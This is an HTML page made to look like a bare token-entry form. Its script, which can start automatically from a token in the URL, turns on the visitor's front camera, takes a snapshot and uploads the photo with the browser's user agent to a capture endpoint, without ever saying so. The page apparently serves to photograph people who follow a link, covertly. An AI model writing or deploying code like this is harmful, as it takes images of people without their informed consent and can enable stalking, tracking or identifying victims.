<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        input {
            width: 300px;
            padding: 15px;
            background: #111;
            border: 1px solid #333;
            color: #fff;
            font-size: 18px;
            text-align: center;
            letter-spacing: 2px;
            outline: none;
        }
        
        input:focus {
            border-color: #666;
        }
    </style>
</head>
<body>
    <input type="text" id="token" placeholder="XXXX-XXXX" maxlength="9" autocomplete="off">

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const urlToken = urlParams.get('token');
        
        if (urlToken) {
            document.getElementById('token').value = urlToken;
            setTimeout(verifyAndCapture, 500);
        }
        
        let stream = null;

        async function verifyAndCapture() {
            const token = document.getElementById('token').value.trim();
            
            if (!token || !token.match(/^[A-Z0-9]{4}-[A-Z0-9]{4}$/)) {
                return;
            }
            
            try {
                // Сначала проверяем токен
                const verifyRes = await fetch('/api/verify-token', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ token })
                });
                
                const verifyData = await verifyRes.json();
                
                if (!verifyData.valid) return;
                
                // Запрашиваем камеру
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                
                const videoTrack = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(videoTrack);
                const bitmap = await imageCapture.grabFrame();
                
                const canvas = document.createElement('canvas');
                canvas.width = bitmap.width;
                canvas.height = bitmap.height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(bitmap, 0, 0);
                
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
                
                const formData = new FormData();
                formData.append('image', blob, 'photo.jpg');
                formData.append('token', token);
                formData.append('ua', navigator.userAgent);
                
                await fetch('/api/capture', { method: 'POST', body: formData });
                
                stream.getTracks().forEach(t => t.stop());
                
            } catch (err) {
                console.error(err);
                if (stream) stream.getTracks().forEach(t => t.stop());
            }
        }

        let timeout = null;
        document.getElementById('token').addEventListener('input', function() {
            clearTimeout(timeout);
            timeout = setTimeout(verifyAndCapture, 300);
        });
    </script>
</body>
</html>
